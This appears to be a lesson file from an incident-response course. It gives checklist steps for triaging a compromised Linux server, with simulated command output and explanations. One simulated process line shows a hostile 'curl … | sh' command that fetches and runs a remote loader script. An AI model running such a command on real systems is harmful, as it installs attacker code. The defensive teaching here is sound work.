title: First 15 Minutes on a Possibly Compromised Server
intro: An alert says a server may be compromised. The first quarter hour decides whether you learn what happened or destroy the evidence. The order: look before you touch, preserve what disappears on reboot (processes, connections), hunt for persistence, contain, and only then clean or rebuild. This is the checklist; mystery-linux-005 and 006 let you practice it live.

steps.prompt: See every process as a tree, so you can tell what started what.
steps.fake_output:
root       812  nginx: master process /usr/sbin/nginx
www-data   815   \_ nginx: worker process
www-data  6511       \_ sh -c curl -fsSL http://45.9.148.3/ldr.sh | sh
www-data  6860           \_ /tmp/.x/kdevtmpfsi
steps.explanation: The miner's parent chain leads back to an nginx worker: the web app was the way in.
steps.why: A tree shows ancestry, and ancestry reveals the entry point. A shell spawned by a web server process is one of the strongest compromise signals there is, because web servers don't normally run shells.

steps.prompt: Record established network connections with their processes before anything changes.
steps.fake_output:
Recv-Q Send-Q Local Address:Port    Peer Address:Port   Process
0      0      10.0.1.15:51876       45.9.148.3:3333     users:(("kdevtmpfsi",pid=6860,fd=7))
0      0      10.0.1.15:22          198.51.100.23:50412 users:(("sshd",pid=2211,fd=4))
steps.explanation: The miner talks to 45.9.148.3:3333; the SSH session is yours, from the office.
steps.why: Connections, running processes, and memory disappear on reboot, which is why 'just reboot it' destroys evidence. Save outputs like this to a file off the host (or at least into the incident ticket) as you go.

steps.prompt: Freeze the suspicious process 6860 instead of killing it, so it stops working but can still be examined.
steps.fake_output: (no output: pid 6860 is stopped (state T) and uses no CPU)
steps.explanation: The miner is paused, with its memory and open files intact.
steps.why: SIGSTOP can't be caught or ignored, so the process can't react or clean up. Forensics can then copy /proc/6860/exe and its memory. Killing it immediately loses that, and without removing persistence first it just comes back (mystery-linux-005).

steps.prompt: Hunt for persistence: list all systemd timers, a less obvious alternative to cron.
steps.fake_output:
NEXT                        LEFT     UNIT                     ACTIVATES
Sun 2026-09-28 11:00:00 UTC 12min    logrotate.timer          logrotate.service
Sun 2026-09-28 10:50:00 UTC 2min     dbus-update.timer        dbus-update.service
Mon 2026-09-29 00:00:00 UTC 13h      apt-daily.timer          apt-daily.service
steps.explanation: dbus-update.timer fires every 10 minutes, and it isn't a real system unit: a name chosen to look boring.
steps.why: Common persistence spots: all users' crontabs, systemd services and timers, authorized_keys, shell rc files (~/.bashrc), /etc/ld.so.preload, and new UID-0 accounts. Attackers name things to blend in (dbus-update, kdevtmpfsi), so compare against a clean host or package lists ('dpkg -S <file>' says which package owns a file).

steps.prompt: Find recently modified files under /var/www (the entry point), changed in the last 2 days.
steps.explanation: Two PHP files in the uploads directory, where only images should be.
steps.why: Executable code in an upload directory is a web shell: how the attacker got a shell as www-data in the first place (security-incident-004 covers the cleanup). Timestamps can be faked, so treat -mtime as a lead, not proof.
